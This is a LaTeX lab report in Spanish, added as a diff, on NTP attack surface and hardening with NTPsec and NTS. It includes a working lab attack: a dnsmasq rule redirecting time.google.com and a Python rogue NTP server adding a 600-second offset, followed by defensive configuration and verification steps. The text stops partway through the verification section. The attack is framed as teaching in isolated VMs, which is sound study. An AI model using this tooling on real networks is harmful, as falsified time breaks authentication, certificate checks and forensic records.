@@ -1,0 +1,754 @@
+\documentclass[11pt,a4paper]{article}
+
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[spanish,es-nodecimaldot]{babel}
+\usepackage{lmodern}
+\usepackage{microtype}
+\usepackage[a4paper,margin=2.5cm]{geometry}
+\usepackage{booktabs}
+\usepackage{tabularx}
+\usepackage{longtable}
+\usepackage{array}
+\usepackage{xcolor}
+\usepackage{hyperref}
+\usepackage{fancyhdr}
+\usepackage{enumitem}
+\usepackage{listings}
+\usepackage{tikz}
+\usetikzlibrary{arrows.meta,positioning,shapes.geometric}
+
+\definecolor{azulacademico}{RGB}{0,51,102}
+\definecolor{grisclaro}{RGB}{245,247,249}
+\definecolor{grisoscuro}{RGB}{70,70,70}
+\definecolor{verdeclaro}{RGB}{235,247,239}
+\definecolor{rojosuave}{RGB}{252,238,238}
+\definecolor{amarilloclaro}{RGB}{255,249,220}
+
+\hypersetup{
+  colorlinks=true,
+  linkcolor=azulacademico,
+  urlcolor=azulacademico,
+  citecolor=azulacademico,
+  pdftitle={Informe de Laboratorio: Seguridad de NTP, NTPsec y NTS},
+  pdfauthor={Javier Siñuka}
+}
+
+\title{Informe de laboratorio: seguridad de NTP, NTPsec y NTS}
+\author{Javier Siñuka}
+\date{12 de septiembre de 2026}
+
+\pagestyle{fancy}
+\fancyhf{}
+\lhead{Laboratorio de Ciberseguridad}
+\rhead{Seguridad de NTP}
+\cfoot{\thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+\setlength{\headheight}{14pt}
+
+\setlength{\parindent}{0pt}
+\setlength{\parskip}{0.65em}
+\setlist[itemize]{leftmargin=1.6em}
+\setlist[enumerate]{leftmargin=1.8em}
+
+\newcommand{\cmd}[1]{\texttt{\detokenize{#1}}}
+\newcommand{\ruta}[1]{\path{#1}}
+\newcommand{\ntpsec}{\textsc{NTPsec}}
+\newcommand{\nts}{\textsc{NTS}}
+
+\lstdefinestyle{terminal}{
+  basicstyle=\ttfamily\small,
+  backgroundcolor=\color{grisclaro},
+  frame=single,
+  rulecolor=\color{black!20},
+  breaklines=true,
+  columns=fullflexible,
+  keepspaces=true,
+  showstringspaces=false,
+  xleftmargin=0.3em,
+  xrightmargin=0.3em
+}
+
+\lstdefinestyle{pythonlab}{
+  language=Python,
+  basicstyle=\ttfamily\footnotesize,
+  backgroundcolor=\color{grisclaro},
+  frame=single,
+  rulecolor=\color{black!20},
+  breaklines=true,
+  columns=fullflexible,
+  keepspaces=true,
+  showstringspaces=false,
+  keywordstyle=\bfseries,
+  xleftmargin=0.3em,
+  xrightmargin=0.3em
+}
+
+\begin{document}
+
+\maketitle
+\thispagestyle{plain}
+
+\clearpage
+\tableofcontents
+\newpage
+
+\begin{abstract}
+El presente informe analiza la seguridad del protocolo Network Time Protocol (NTP), las vulnerabilidades de su operación sin autenticación, las consecuencias de una manipulación de la hora del sistema y las medidas de mitigación disponibles mediante \ntpsec{} y Network Time Security (\nts{}). Se estudia la viabilidad de un ataque de intermediario (MITM) sobre NTP y se propone una implementación estrictamente controlada en un laboratorio aislado, basada en redirección DNS y un servidor NTP de prueba que entrega una hora deliberadamente incorrecta. Posteriormente se muestra por qué \nts{}, definido por RFC 8915, impide que un atacante suplante simplemente al servidor de tiempo mediante DNS o falsificación de paquetes. Finalmente se propone una configuración reforzada para un host Linux, un procedimiento reproducible para verificarla y se evalúa el servidor argentino publicado por INTI, \texttt{ntp.inti.gob.ar}. El análisis se apoya en RFC 5905, RFC 7384, RFC 8633, RFC 8915, documentación actual de \ntpsec{} y fuentes oficiales de INTI y BIPM.
+\end{abstract}
+
+\section{Introducción}
+
+La sincronización horaria es un servicio básico de infraestructura, pero tiene implicancias directas sobre la seguridad. Registros de auditoría, certificados X.509, Kerberos, sistemas de autenticación con ventanas temporales, correlación de eventos en un SIEM, tareas programadas y mecanismos anti-replay dependen de que el reloj del sistema sea razonablemente correcto. RFC 8633 remarca que la ausencia de una fuente de tiempo confiable puede afectar esquemas de autenticación y permitir, en determinados escenarios, el uso de credenciales expiradas o la repetición de mensajes que deberían procesarse una sola vez \cite{rfc8633}.
+
+NTPv4, definido por RFC 5905, fue diseñado para sincronizar relojes a través de redes de latencia variable \cite{rfc5905}. Su modo cliente-servidor clásico utiliza UDP/123. Históricamente, una gran parte de las implementaciones operó sin autenticación criptográfica. En consecuencia, si un adversario obtiene una posición de intermediario en la red puede descartar, retrasar, reproducir o modificar mensajes de sincronización, y con ello degradar o falsear la hora observada por el cliente \cite{rfc7384,rfc8633}.
+
+\ntpsec{} surge como una implementación endurecida y modernizada del protocolo NTP. Mantiene compatibilidad con el funcionamiento cliente-servidor habitual, pero reduce superficie de ataque y elimina mecanismos heredados considerados inseguros, como Autokey y ciertos modos de operación. A septiembre de 2026, la versión estable publicada es \ntpsec{} 1.2.5 \cite{ntpsec125}. Una de sus capacidades más importantes es el soporte de \nts{}, estandarizado por RFC 8915, que agrega autenticación criptográfica y protección de integridad a la sincronización temporal \cite{rfc8915}.
+
+\section{Objetivos}
+
+\subsection{Objetivo general}
+Analizar los riesgos de seguridad asociados con NTP sin autenticación y demostrar, en un entorno controlado, cómo un atacante con capacidad de intermediario podría intentar desviar la sincronización horaria, para luego aplicar medidas de defensa basadas en \ntpsec{}, \nts{}, endurecimiento de configuración y verificación operativa.
+
+\subsection{Objetivos específicos}
+\begin{itemize}
+    \item Identificar vulnerabilidades de protocolo, configuración e implementación relacionadas con NTP.
+    \item Explicar el impacto de una manipulación de la hora sobre servicios de seguridad y trazabilidad.
+    \item Evaluar la viabilidad de un ataque MITM sobre NTP sin autenticación.
+    \item Implementar una demostración de laboratorio aislada sin afectar redes ni servicios de terceros.
+    \item Comparar el comportamiento del cliente NTP clásico con un cliente protegido mediante \nts{}.
+    \item Proponer una configuración reforzada de \ntpsec{} para un host Linux.
+    \item Definir un procedimiento de verificación de configuración, sincronización y autenticación.
+    \item Evaluar el servidor de tiempo argentino publicado oficialmente por INTI.
+\end{itemize}
+
+\section{Fundamentos de NTP y NTPsec}
+
+\subsection{Funcionamiento básico de NTP}
+
+En una asociación cliente-servidor, el cliente envía una consulta NTP en modo 3 y recibe una respuesta en modo 4. La estimación del desfase se realiza a partir de cuatro marcas temporales: envío del cliente, recepción del servidor, transmisión del servidor y recepción final del cliente. A partir de ellas pueden estimarse el \emph{offset} y el retardo de ida y vuelta. NTP no se limita a copiar la hora de un único servidor; las implementaciones completas utilizan filtros, selección de fuentes, clustering y disciplina del reloj para descartar mediciones incoherentes y ajustar progresivamente el reloj local \cite{rfc5905}.
+
+RFC 8633 recomienda emplear varias fuentes de tiempo independientes y diversas. En particular, cuatro o más fuentes son preferibles cuando se requiere robustez, porque permiten conservar múltiples referencias aun cuando una fuente falle o se vuelva inexacta \cite{rfc8633}.
+
+\subsection{NTPsec}
+
+\ntpsec{} es una bifurcación orientada al endurecimiento del código de NTP clásico. El proyecto eliminó grandes porciones de código heredado y mecanismos con historial de problemas de seguridad. Entre los cambios relevantes se encuentran la eliminación de Autokey, de \texttt{ntpdc}, de modos que no pueden protegerse adecuadamente y la exigencia de autenticación para operaciones de reconfiguración remota. Además implementa \nts{} como mecanismo moderno de autenticación \cite{ntpsecdifferences}.
+
+Por ello, afirmar que \ntpsec{} es ``compatible con ntpd'' es correcto para el uso normal de NTP cliente-servidor, pero no significa compatibilidad absoluta con todas las características históricas de NTP Classic. Algunas funciones antiguas fueron eliminadas precisamente para disminuir la superficie de ataque.
+
+\subsection{Network Time Security (NTS)}
+
+RFC 8915 divide \nts{} en dos componentes \cite{rfc8915}:
+
+\begin{enumerate}
+    \item \textbf{NTS Key Establishment (NTS-KE):} se ejecuta sobre TLS, normalmente en TCP/4460. Autentica al servidor mediante certificados X.509 y negocia material criptográfico.
+    \item \textbf{NTPv4 con campos de extensión NTS:} la sincronización continúa mediante NTP, normalmente UDP/123, pero cada intercambio incorpora información autenticada y cookies criptográficas.
+\end{enumerate}
+
+El objetivo principal es que el cliente pueda verificar que la información temporal procede del servidor autenticado y no fue alterada en tránsito. El contenido horario básico no necesita confidencialidad; la propiedad crítica es autenticidad e integridad. Es importante remarcar que \nts{} no elimina todas las amenazas: un adversario capaz de controlar el camino de red todavía puede descartar paquetes o introducir retrasos. RFC 8633 advierte que los ataques por manipulación de demora no quedan completamente resueltos ni siquiera utilizando mecanismos criptográficos \cite{rfc8633}.
+
+\begin{figure}[ht]
+\centering
+\begin{tikzpicture}[
+    node distance=1.55cm and 2.0cm,
+    box/.style={draw, rounded corners, align=center, minimum width=3.4cm, minimum height=1.0cm, fill=grisclaro},
+    arrow/.style={-{Latex[length=2.5mm]}, thick}
+]
+\node[box] (client) {Cliente NTP/NTPsec};
+\node[box, right=of client] (ke) {NTS-KE\\TLS, TCP/4460};
+\node[box, right=of ke] (server) {Servidor NTS\\certificado X.509};
+\node[box, below=1.4cm of ke] (ntp) {NTPv4 + campos NTS\\UDP/123};
+\draw[arrow] (client) -- node[above]{autenticación y claves} (ke);
+\draw[arrow] (ke) -- (server);
+\draw[arrow] (client) -- (ntp);
+\draw[arrow] (ntp) -- node[below]{tiempo autenticado} (server);
+\end{tikzpicture}
+\caption{Arquitectura simplificada de NTS. La autenticación inicial se separa del tráfico NTP de baja latencia.}
+\end{figure}
+
+\section{Vulnerabilidades y superficie de ataque de NTP}
+
+Conviene separar dos categorías: \textbf{debilidades inherentes al uso de NTP sin autenticación} y \textbf{vulnerabilidades de software concretas}. Las primeras permanecen mientras se utilice NTP clásico en texto claro; las segundas dependen de la versión instalada y pueden estar corregidas.
+
+\begin{longtable}{>{\raggedright\arraybackslash}p{3.3cm} >{\raggedright\arraybackslash}p{5.2cm} >{\raggedright\arraybackslash}p{5.2cm}}
+\toprule
+\textbf{Riesgo} & \textbf{Descripción} & \textbf{Impacto posible} \\
+\midrule
+\endfirsthead
+\toprule
+\textbf{Riesgo} & \textbf{Descripción} & \textbf{Impacto posible} \\
+\midrule
+\endhead
+NTP sin autenticación & Un atacante en el camino puede intentar modificar o falsificar respuestas NTP. & Desplazamiento del reloj, degradación de sincronización, pérdida de confianza en marcas temporales. \\
+\addlinespace
+Suplantación DNS & Si el cliente selecciona el servidor por nombre y el atacante controla DNS, puede resolver ese nombre hacia un servidor temporal malicioso. & Redirección a una fuente de hora falsa. Con NTS, la validación del certificado debería impedir la suplantación simple. \\
+\addlinespace
+Manipulación de retardo & Un adversario en el camino puede retrasar selectivamente paquetes sin modificar su contenido. & Sesgo temporal o aumento de incertidumbre. NTS no elimina por completo este riesgo. \\
+\addlinespace
+Replay/inyección & Paquetes antiguos o fabricados pueden utilizarse contra clientes no autenticados bajo determinadas condiciones. & Hora incorrecta, pérdida de disponibilidad o degradación del algoritmo de selección. \\
+\addlinespace
+DDoS por reflexión/amplificación & Históricamente, consultas de control NTP generaron respuestas mayores que las solicitudes y fueron abusadas con direcciones IP falsificadas. & Uso del servidor como reflector, saturación de terceros y del propio servicio. \\
+\addlinespace
+Fuga de información & Consultas de control pueden exponer información operacional sobre peers, referencias o estado. & Facilita reconocimiento y construcción de ataques dirigidos. \\
+\addlinespace
+Abuso de KoD/control & Mensajes \emph{Kiss-o'-Death} y mecanismos de control mal protegidos han sido fuente de ataques de disponibilidad en implementaciones anteriores. & Interrupción de sincronización o caída del daemon en versiones afectadas. \\
+\addlinespace
+Errores de implementación & NTP Classic tuvo históricamente desbordamientos, fugas de memoria y fallos de validación de entradas. & DoS y, en versiones antiguas, potencial ejecución de código o corrupción de memoria. \\
+\bottomrule
+\end{longtable}
+
+\subsection{Ejemplos históricos de vulnerabilidades de implementación}
+
+La existencia de problemas históricos no implica que una versión actual y parchada siga siendo vulnerable. Sirve, sin embargo, para justificar una política estricta de actualización. Entre los casos documentados por Network Time Foundation se encuentran:
+
+\begin{itemize}
+    \item \textbf{CVE-2014-9295:} múltiples desbordamientos de búfer en versiones anteriores a NTP 4.2.8; uno de ellos podía permitir ejecución de código con los privilegios del proceso \texttt{ntpd} \cite{cve20149295}.
+    \item \textbf{CVE-2020-15025:} fuga de memoria asociada con claves CMAC, corregida en NTP 4.2.8p15 \cite{cve202015025}.
+    \item \textbf{CVE-2023-26551/52/53/54:} problemas de límites en \texttt{ntpq}, corregidos en 4.2.8p16; el componente afectado fue la herramienta de consulta y no el daemon \texttt{ntpd} \cite{cve20232655x}.
+    \item \textbf{KoD RATE / bug 3767:} determinadas respuestas maliciosas podían provocar un \emph{assertion abort} en builds con depuración de versiones afectadas; corregido en 4.2.8p16 \cite{bug3767}.
+\end{itemize}
+
+La versión estable recomendada de NTP Classic continúa siendo 4.2.8p18 según la documentación oficial consultada \cite{ntpclassic}. Para \ntpsec{}, la versión 1.2.5 fue publicada el 31 de julio de 2026 \cite{ntpsec125}. En cualquier despliegue real la primera defensa consiste en utilizar una implementación mantenida y actualizada.
+
+\section{Implicancias de una explotación exitosa}
+
+Modificar la hora de un sistema puede tener efectos más amplios que mostrar una fecha incorrecta. El riesgo exacto depende de cuánto se altere el reloj y de qué aplicaciones dependan de él.
+
+\begin{itemize}
+    \item \textbf{Certificados TLS:} un reloj desfasado puede hacer que certificados válidos parezcan todavía no válidos o ya expirados, provocando fallos de conexión. En sentido inverso, una aplicación mal diseñada podría tomar decisiones erróneas respecto de períodos de validez.
+    \item \textbf{Kerberos y autenticación temporal:} Kerberos utiliza tolerancias de desfase para reducir ataques de replay. Una diferencia grande puede impedir autenticaciones legítimas.
+    \item \textbf{TOTP y tokens temporales:} los códigos de un solo uso dependen de ventanas temporales. Un desfase puede causar rechazo de códigos válidos y degradar disponibilidad.
+    \item \textbf{Registros y forense:} si cada equipo registra una hora diferente, se vuelve difícil ordenar cronológicamente un incidente y correlacionar firewall, servidor, endpoint y SIEM.
+    \item \textbf{Tareas programadas y automatización:} \texttt{cron}, temporizadores, expiraciones, rotación de logs y procesos batch pueden ejecutarse antes, después o repetirse de manera inesperada.
+    \item \textbf{Sistemas distribuidos:} aplicaciones que utilizan tiempo de pared para expiración, lease, caching o correlación pueden sufrir inconsistencias.
+    \item \textbf{Mecanismos anti-replay:} los controles basados en ventanas temporales pueden fallar si la noción de tiempo del host es incorrecta.
+\end{itemize}
+
+En un SOC, una manipulación de tiempo tiene además un efecto estratégico: degrada la calidad de la evidencia. Aunque un atacante no consiga comprometer otros controles, alterar las marcas temporales puede complicar severamente una investigación.
+
+\section{¿Es posible un ataque MITM contra NTP?}
+
+\textbf{Sí, si el cliente utiliza NTP sin autenticación y el atacante obtiene capacidad de intermediario o logra controlar la resolución/ruta hacia la fuente de tiempo.} RFC 8633 describe explícitamente que un adversario MITM puede descartar, reproducir o modificar NTP sin protección \cite{rfc8633}.
+
+La factibilidad depende de la posición del atacante:
+
+\begin{enumerate}
+    \item En una LAN compartida o punto de acceso controlado por el atacante, este puede influir en DNS, DHCP o ruteo.
+    \item Si el cliente confía en un nombre de servidor NTP y utiliza DNS no protegido, una redirección puede llevarlo a un servidor falso.
+    \item Si el atacante está realmente en el camino de UDP/123, puede intentar inyectar una respuesta antes de que llegue la legítima.
+    \item Si el cliente usa \nts{} correctamente, la mera redirección DNS ya no es suficiente: el servidor falso debe presentar un certificado válido para el nombre esperado y además generar respuestas NTS autenticadas.
+\end{enumerate}
+
+\subsection{Qué no resuelve NTS}
+
+NTS protege identidad, autenticidad e integridad de los intercambios, pero no puede impedir que un actor en el camino bloquee paquetes. Tampoco elimina completamente los ataques por demora: un paquete autenticado puede ser retenido antes de entregarse. Por ello, la defensa completa combina NTS, diversidad de fuentes, monitoreo de offset/jitter/delay y controles de red.
+
+\section{Implementación controlada del laboratorio MITM}
+
+El escenario proporcionado para la práctica propone un punto de acceso controlado, redirección DNS de un nombre de servidor de tiempo y un servidor NTP manipulado que entrega respuestas incorrectas. Ese diseño es técnicamente válido para demostrar el problema, pero debe ejecutarse exclusivamente en infraestructura propia y aislada.
+
+Para reducir el riesgo de afectar dispositivos ajenos, se propone una variante equivalente con \textbf{tres máquinas virtuales conectadas únicamente a una red host-only sin salida a Internet}. No se utiliza ARP spoofing ni se intercepta tráfico de terceros.
+
+\subsection{Topología}
+
+\begin{figure}[ht]
+\centering
+\begin{tikzpicture}[
+    node distance=1.8cm and 2.4cm,
+    box/.style={draw, rounded corners, align=center, minimum width=3.6cm, minimum height=1.2cm},
+    evil/.style={box, fill=rojosuave},
+    normal/.style={box, fill=grisclaro},
+    good/.style={box, fill=verdeclaro},
+    arrow/.style={-{Latex[length=2.5mm]}, thick}
+]
+\node[evil] (att) {VM atacante/laboratorio\\10.77.0.1\\DNS + NTP falso};
+\node[normal, right=of att] (vic) {VM cliente\\10.77.0.10\\NTPsec};
+\node[good, below=1.5cm of vic] (real) {Fase defensiva\\Servidor NTS auténtico\\(salida a Internet sólo al finalizar)};
+\draw[arrow] (vic) -- node[above]{DNS: time.google.com} (att);
+\draw[arrow] (att) -- node[below]{IP 10.77.0.1} (vic);
+\draw[arrow] (vic) -- node[right]{NTP/UDP 123} (att);
+\draw[arrow,dashed] (vic) -- node[right]{NTS-KE/TLS + NTP autenticado} (real);
+\end{tikzpicture}
+\caption{Topología segura propuesta. La fase ofensiva se mantiene en una red virtual aislada.}
+\end{figure}
+
+\subsection{Paso 1: preparar la VM de laboratorio}
+
+En Debian/Ubuntu se pueden instalar los componentes necesarios:
+
+\begin{lstlisting}[style=terminal]
+sudo apt update
+sudo apt install dnsmasq python3 tcpdump
+\end{lstlisting}
+
+Se configura la interfaz host-only de la VM de laboratorio con \texttt{10.77.0.1/24}. La VM cliente utiliza \texttt{10.77.0.10/24} y como DNS \texttt{10.77.0.1}. No se debe configurar puerta de enlace hacia Internet durante la fase ofensiva.
+
+\subsection{Paso 2: redirección DNS limitada al laboratorio}
+
+Crear \ruta{/etc/dnsmasq.d/ntp-lab.conf}:
+
+\begin{lstlisting}[style=terminal]
+interface=eth1
+bind-interfaces
+listen-address=10.77.0.1
+address=/time.google.com/10.77.0.1
+log-queries
+log-facility=/var/log/dnsmasq-ntp-lab.log
+\end{lstlisting}
+
+Reiniciar y comprobar:
+
+\begin{lstlisting}[style=terminal]
+sudo systemctl restart dnsmasq
+# Desde la VM cliente:
+getent ahostsv4 time.google.com
+\end{lstlisting}
+
+La resolución debe devolver \texttt{10.77.0.1}. Esto demuestra que un atacante que controla DNS puede dirigir un cliente NTP no autenticado hacia una fuente temporal bajo su control.
+
+\subsection{Paso 3: servidor NTP de laboratorio con offset deliberado}
+
+El siguiente servidor mínimo responde sólo para fines de laboratorio y agrega un offset de 600 segundos. Debe ejecutarse en la VM controlada, nunca en una interfaz expuesta a Internet.
+
+\begin{lstlisting}[style=pythonlab]
+#!/usr/bin/env python3
+import socket
+import struct
+import time
+
+BIND = "10.77.0.1"
+PORT = 123
+OFFSET = 600          # +10 minutos
+NTP_EPOCH = 2208988800
+
+def ntp_ts(unix_time):
+    value = unix_time + NTP_EPOCH
+    sec = int(value)
+    frac = int((value - sec) * (1 << 32))
+    return struct.pack("!II", sec, frac)
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.bind((BIND, PORT))
+print(f"NTP LAB escuchando en {BIND}:{PORT}, offset={OFFSET}s")
+
+while True:
+    data, addr = sock.recvfrom(1024)
+    if len(data) < 48:
+        continue
+
+    version = (data[0] >> 3) & 0x07
+    version = version if version in (3, 4) else 4
+
+    reply = bytearray(48)
+    reply[0] = (0 << 6) | (version << 3) | 4   # LI=0, VN, mode=server
+    reply[1] = 2                               # stratum de laboratorio
+    reply[2] = 6                               # poll
+    reply[3] = 0xEC                            # precision aproximada
+    reply[12:16] = b"LAB "                    # reference ID
+
+    # Originate Timestamp = Transmit Timestamp recibido del cliente
+    reply[24:32] = data[40:48]
+
+    now = time.time() + OFFSET
+    reply[16:24] = ntp_ts(now - 1)             # reference timestamp
+    reply[32:40] = ntp_ts(now)                 # receive timestamp
+    reply[40:48] = ntp_ts(now)                 # transmit timestamp
+
+    sock.sendto(reply, addr)
+\end{lstlisting}
+
+Ejecutar con privilegios exclusivamente dentro de la VM aislada:
+
+\begin{lstlisting}[style=terminal]
+sudo python3 fake_ntp_lab.py
+\end{lstlisting}
+
+\subsection{Paso 4: observar el efecto sin modificar todavía el reloj}
+
+Con \ntpsec{} instalado en la VM cliente, \cmd{ntpdig} permite consultar un servidor y mostrar el offset sin ajustar el reloj si no se usan las opciones \texttt{-S} o \texttt{-s} \cite{ntpdig}:
+
+\begin{lstlisting}[style=terminal]
+ntpdig -d time.google.com
+\end{lstlisting}
+
+En el laboratorio, el nombre se resolverá a \texttt{10.77.0.1}. La salida debería indicar aproximadamente un desfase de 600 segundos. Con esto se demuestra el impacto sin alterar el reloj del cliente.
+
+Sólo si se utiliza una VM descartable y se desea observar el ajuste real, puede ejecutarse:
+
+\begin{lstlisting}[style=terminal]
+sudo ntpdig -S time.google.com
+\end{lstlisting}
+
+Al finalizar, se revierte el snapshot de la VM. No se recomienda realizar esta prueba sobre la estación de trabajo principal porque un salto horario puede afectar sesiones, certificados, logs y software en ejecución.
+
+\subsection{Paso 5: capturar evidencia}
+
+En la VM cliente:
+
+\begin{lstlisting}[style=terminal]
+sudo tcpdump -ni eth1 'udp port 53 or udp port 123'
+\end{lstlisting}
+
+La captura debe mostrar primero la resolución DNS hacia \texttt{10.77.0.1} y luego el intercambio NTP UDP/123 con esa dirección. Esta evidencia permite documentar la cadena causal: \emph{resolución manipulada} $\rightarrow$ \emph{consulta al servidor falso} $\rightarrow$ \emph{offset temporal incorrecto}.
+
+\section{Prueba defensiva con NTPsec y NTS}
+
+\subsection{Instalación y configuración}
+
+En distribuciones Debian/Ubuntu recientes:
+
+\begin{lstlisting}[style=terminal]
+sudo apt update
+sudo apt install ntpsec ca-certificates
+\end{lstlisting}
+
+La documentación de \ntpsec{} indica que, en paquetes Debian y derivados, la configuración suele ubicarse en \ruta{/etc/ntpsec/ntp.conf}; en otras instalaciones puede utilizarse \ruta{/etc/ntp.conf} \cite{ntpsecquick}.
+
+Una configuración de referencia, orientada a un host cliente que no debe prestar servicio horario a terceros, es:
+
+\begin{lstlisting}[style=terminal]
+# /etc/ntpsec/ntp.conf
+
+driftfile /var/lib/ntpsec/ntp.drift
+
+# Restringir consultas y reconfiguracion remota.
+restrict default kod limited nomodify noquery
+restrict 127.0.0.1
+restrict ::1
+
+# Fuentes autenticadas mediante NTS.
+server time.cloudflare.com nts iburst
+server nts.netnod.se nts iburst
+server ptbtime1.ptb.de nts iburst
+server ptbtime4.ptb.de nts iburst
+\end{lstlisting}
+
+Cloudflare documenta \texttt{time.cloudflare.com} como servicio compatible con NTS \cite{cloudflarents}; Netnod ofrece públicamente \texttt{nts.netnod.se} y varios endpoints regionales \cite{netnodnts}; y PTB informa que sus servidores públicos NTP ofrecen también NTS, incluyendo \texttt{ptbtime1.ptb.de} a \texttt{ptbtime4.ptb.de} \cite{ptbnts}. Se utilizan nombres DNS y no direcciones IP porque la validación TLS debe coincidir con el nombre del certificado.
+
+Reiniciar el servicio:
+
+\begin{lstlisting}[style=terminal]
+sudo systemctl restart ntpsec
+systemctl --no-pager --full status ntpsec
+\end{lstlisting}
+
+El nombre exacto de la unidad puede variar según la distribución; si \texttt{ntpsec.service} no existe, se debe verificar con \cmd{systemctl list-unit-files | grep -Ei 'ntp|chrony|timesync'}.
+
+\subsection{Verificación de NTS}
+
+\ntpsec{} documenta dos comprobaciones especialmente útiles \cite{ntpsecnts}:
+
+\begin{lstlisting}[style=terminal]
+ntpq -p
+ntpq -c nts
+\end{lstlisting}
+
+Con NTS activo, la columna de tipo de \cmd{ntpq -p} refleja asociaciones NTS y \cmd{ntpq -c nts} muestra contadores de cliente/servidor y NTS-KE. También se pueden revisar los logs:
+
+\begin{lstlisting}[style=terminal]
+journalctl -u ntpsec --since "10 minutes ago" --no-pager
+\end{lstlisting}
+
+En una negociación correcta deben aparecer referencias a NTS-KE, conexión al puerto 4460, versión TLS, validación del certificado y recepción de cookies.
+
+\subsection{Resultado esperado frente a la redirección DNS}
+
+Si se repite la redirección DNS del laboratorio intentando llevar \texttt{time.cloudflare.com} a \texttt{10.77.0.1}, el cliente NTS no debería aceptar al servidor NTP falso. La negociación NTS-KE requiere TLS y un certificado válido para \texttt{time.cloudflare.com}. El servidor de laboratorio no posee esa clave privada ni un certificado emitido para ese nombre, por lo que la autenticación falla.
+
+Este contraste constituye el resultado central del laboratorio:
+
+\begin{center}
+\begin{tabularx}{\textwidth}{>{\bfseries}p{3.8cm} X X}
+\toprule
+ & \textbf{NTP clásico} & \textbf{NTP + NTS} \\
+\midrule
+DNS manipulado & Puede redirigir al cliente a un NTP falso si no existe otro control. & DNS puede redirigir, pero no aporta un certificado válido ni claves NTS. \\
+Integridad & No garantizada criptográficamente en el modo básico. & Mensajes autenticados mediante claves negociadas por NTS-KE. \\
+Suplantación simple & Factible para un atacante en posición adecuada. & Debe superar autenticación TLS/NTS; la suplantación simple deja de ser suficiente. \\
+Ataque por demora/bloqueo & Posible. & Sigue siendo posible bloquear o retrasar tráfico, aunque no modificarlo silenciosamente. \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+\section{¿Cuál es la configuración NTP actual del host?}
+
+No es posible afirmar de manera académicamente correcta cuál es la configuración \emph{real} del equipo del alumno sin ejecutar comandos en ese host. Inferirla a partir de la distribución sería incorrecto, porque pueden coexistir o haberse reemplazado \texttt{systemd-timesyncd}, Chrony, NTP Classic o \ntpsec{}.
+
+El relevamiento exacto se obtiene con el siguiente bloque:
+
+\begin{lstlisting}[style=terminal]
+timedatectl status
+
+systemctl list-unit-files | grep -Ei 'ntp|chrony|timesync'
+systemctl --type=service --state=running | grep -Ei 'ntp|chrony|timesync'
+
+ps -ef | grep -E '[n]tpd|[c]hronyd|systemd-timesyncd'
+
+# NTPsec / NTP Classic
+ntpq -pn 2>/dev/null
+ntpq -c rv 2>/dev/null
+
+# Chrony, si se utiliza
+chronyc tracking 2>/dev/null
+chronyc sources -v 2>/dev/null
+
+# systemd-timesyncd, si se utiliza
+timedatectl timesync-status 2>/dev/null
+
+# Archivos de configuracion posibles
+sudo sed -n '1,220p' /etc/ntpsec/ntp.conf 2>/dev/null
+sudo sed -n '1,220p' /etc/ntp.conf 2>/dev/null
+sudo sed -n '1,220p' /etc/chrony/chrony.conf 2>/dev/null
+\end{lstlisting}
+
+\textbf{Interpretación:} debe existir un único mecanismo principal de disciplina horaria, o al menos no deben competir dos daemons intentando ajustar simultáneamente el reloj. En una entrega experimental, las salidas anteriores son la evidencia que permite completar la frase ``mi configuración actual es...'' sin especular.
+
+\section{Cómo configurar un host para evitar problemas con NTP}
+
+La protección efectiva no depende de una sola directiva. Se recomienda combinar las siguientes capas:
+
+\subsection{1. Utilizar una implementación mantenida}
+
+Actualizar \ntpsec{}, Chrony o NTP Classic mediante los repositorios de la distribución. No deben mantenerse versiones antiguas con vulnerabilidades conocidas. Si se usa NTP Classic, 4.2.8p18 es la última versión estable publicada por Network Time Foundation al momento de este informe \cite{ntpclassic}. En \ntpsec{}, 1.2.5 es la versión estable más reciente localizada \cite{ntpsec125}.
+
+\subsection{2. Preferir NTS para fuentes públicas}
+
+Configurar la palabra clave \texttt{nts} únicamente con servidores que anuncien soporte NTS. La documentación de \ntpsec{} señala que NTS 1.2.0 fue la primera versión del proyecto con soporte completo del RFC 8915 \cite{ntpsecnts}.
+
+\subsection{3. Usar varias fuentes y diversidad}
+
+RFC 8633 recomienda cuatro o más fuentes cuando se busca robustez. La diversidad debe ser real: diferentes organizaciones, ubicaciones y caminos de red reducen el riesgo de que un único fallo o actor controle todas las mediciones \cite{rfc8633}.
+
+\subsection{4. Restringir consultas y control remoto}
+
+Para un cliente que no actúa como servidor, una política como la siguiente reduce exposición:
+
+\begin{lstlisting}[style=terminal]
+restrict default kod limited nomodify noquery
+restrict 127.0.0.1
+restrict ::1
+\end{lstlisting}
+
+Es el patrón recomendado en la guía rápida de \ntpsec{} para restringir configuración y consultas desde sistemas remotos \cite{ntpsecquick}. \texttt{noquery} no impide la sincronización normal con los servidores configurados; restringe consultas de control.
+
+\subsection{5. Filtrado de red}
+
+En un host cliente, el firewall puede evitar que el equipo se convierta en servidor NTP accidentalmente. Debe permitirse tráfico saliente hacia UDP/123 y TCP/4460 cuando se utiliza NTS, junto con las respuestas de conexiones establecidas, y bloquear nuevas consultas NTP entrantes desde redes no autorizadas. La política concreta depende de nftables/iptables y del rol del host.
+
+\subsection{6. Proteger DNS y la ruta de red}
+
+NTS reduce el impacto de una resolución DNS maliciosa porque valida la identidad del servidor mediante TLS. Aun así, es recomendable utilizar resolvers confiables, DNSSEC donde corresponda y segmentación adecuada. En redes críticas, puede complementarse con VPN, IPsec o enlaces dedicados.
+
+\subsection{7. Mantener el umbral de pánico y evitar ajustes arbitrarios}
+
+\texttt{ntpd} tiene mecanismos destinados a evitar saltos extremadamente grandes sin intervención. Desactivar permanentemente esos límites reduce una barrera frente a una fuente de tiempo maliciosa. Debe distinguirse entre la corrección inicial de un reloj evidentemente desajustado y la operación normal.
+
+\subsection{8. Monitorear y alertar}
+
+Debe supervisarse al menos:
+
+\begin{itemize}
+    \item servidor actualmente seleccionado;
+    \item offset y jitter;
+    \item stratum;
+    \item reachability;
+    \item cambios frecuentes de fuente;
+    \item fallos NTS-KE o certificados;
+    \item saltos de reloj;
+    \item paquetes NTP de respuesta no solicitados;
+    \item eventos de reinicio del daemon por umbrales de seguridad.
+\end{itemize}
+
+\section{Cómo verificar que la configuración es correcta}
+
+Una verificación completa debe evaluar servicio, sincronización, autenticación y comportamiento ante fallos.
+
+\subsection{Estado del servicio}
+
+\begin{lstlisting}[style=terminal]
+systemctl --no-pager status ntpsec
+journalctl -u ntpsec -b --no-pager | tail -n 100
+\end{lstlisting}
+
